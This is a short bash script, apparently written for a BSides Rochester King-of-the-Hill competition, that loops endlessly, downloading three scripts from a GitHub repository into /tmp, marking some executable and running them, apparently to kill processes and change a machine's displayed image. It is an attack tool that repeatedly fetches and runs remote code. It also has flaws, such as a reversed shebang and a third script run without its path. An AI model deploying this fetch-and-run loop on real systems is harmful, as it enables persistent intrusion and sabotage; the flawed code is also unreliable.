!#/bin/bash
while :
do
	wget -O /tmp/one.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/killpross.sh
	wget -O /tmp/two.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
	wget -O /tmp/three.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/vader.sh
	sleep 1
	chmod +x /tmp/one.sh & chmod +x /tmp/two.sh
	/tmp/one.sh & /tmp/two.sh & three.sh & 
done
